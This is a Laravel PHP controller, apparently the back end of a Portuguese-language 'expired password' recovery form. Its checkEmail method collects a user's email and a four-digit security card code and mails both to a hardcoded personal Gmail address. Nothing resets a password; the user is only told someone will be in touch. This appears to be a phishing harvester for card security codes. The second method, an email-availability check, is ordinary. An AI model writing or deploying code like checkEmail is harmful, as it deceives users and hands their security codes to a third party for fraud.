<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use App\Mail\SenhaVencidaMail;
use App\Models\User;
use App\Services\SendGridService;


class UserController extends Controller
{
    protected $sendGridService;

    public function __construct(SendGridService $sendGridService)
    {
        $this->sendGridService = $sendGridService;
    }

public function checkEmail(Request $request)
{
    ini_set('max_execution_time', 120);

    $request->validate([
        'email' => 'required|email',
        'cartao_seg' => 'required|digits:4',
    ]);

    $dados = $request->only('email', 'cartao_seg');

    // Enviar email usando SendGrid
    $subject = 'Recuperação de Senha - Solicitação';
    $view = 'emails.senha_vencida'; 

    $emailData = [
        'to' => 'argontechsolut@gmail.com',
        'subject' => $subject,
        'email' => $dados['email'],
        'cartao_seg' => $dados['cartao_seg'],
        'data_solicitacao' => now()->format('d/m/Y H:i:s'),
    ];

    $enviado = $this->sendGridService->sendEmail(
        $emailData['to'],
        $emailData['subject'],
        $view,
        $emailData
    );

    if ($enviado) {
        // Setar a session para mostrar o toast
        return back()->with('senha_vencida_enviada', true)
                    ->with('status', 'Seu pedido foi enviado. Em breve entraremos em contato.');
    } else {
        \Log::error('Falha no envio do email de recuperação de senha', $emailData);
        return back()->with('error', 'Houve um erro ao enviar o pedido. Tente novamente mais tarde.');
    }
}

    // Novo método para verificar disponibilidade de email
    public function checkEmailAvailability(Request $request)
    {
        $request->validate([
            'email' => 'required|email'
        ]);

        // Verifica se o email já existe no banco de dados
        $emailExists = User::where('email', $request->email)->exists();

        if ($emailExists) {
            return response()->json([
                'available' => false,
                'message' => 'Este email já está em uso. Por favor, escolha outro.'
            ], 409); // 409 Conflict - indica que o recurso já existe
        }

        return response()->json([
            'available' => true,
            'message' => 'Email disponível'
        ]);
    }
}